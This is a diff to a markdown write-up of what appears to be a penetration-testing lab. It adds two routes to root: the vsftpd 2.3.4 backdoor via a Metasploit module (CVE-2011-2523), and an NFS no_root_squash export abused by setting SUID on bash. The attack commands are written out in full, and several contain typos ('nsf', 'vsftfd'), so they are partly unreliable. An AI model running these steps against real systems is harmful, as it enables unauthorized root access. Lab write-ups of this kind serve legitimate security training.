@@ -16,9 +16,9 @@
 ## Attack Flow Summary
 
 Reconnaissance  
-→ Service Enumeration  
-→ Initial Shell (daemon)  
-→ Privilege Escalation (NFS no_root_squash)  
+→ Service Enumeration (nmap)
+→ Initial Shell vsftfd 2.3.4 backdoor --> Root (path1) 
+→ Privilege Escalation (NFS no_root_squash) --> Privilege (path2)
 → Root Access
 
 ---
@@ -53,16 +53,29 @@ gobuster dir -u http://<TARGET_IP> \
 Finding
 phpinfo.php disclosed server paths and configuration details
 
-## Initial Access
-A low-privileged shell was obtained:
+## Initial Access--Path 1 (vsftpd Backdoor)
+Exploit:unix/ftp/vsftpd_234_backdoor
+CVE:CVE-2011-2523
+Result:Root shell
 ```
-whoami
-daemon
+use exploit/unix/vsftpd_234_backdoor
+set RHOST <TARGET_IP>
+set LHOST <KALI_IP>
+run
+getuid # Server username : root
 ```
 
-## Privilege Escalation Enumeration
+## Privilege Escalation Enumeration--Path2
+(NSF Misconfiguration)
+Find:NFS export root filesystem with no_root_squash
+CVE:N/A(misconfiguration)
+Result:Root via SUID bash
 ```
 showmount -e <TARGET_IP>
+mount -t nsf <TARGET_IP>:/ /mnt/target
+chmod +s /mnt/target/bin/bash
+bin/bash -p
+id #euid=0(root0
 ```
 ## Critical Finding
 Root filesystem exported via NFS
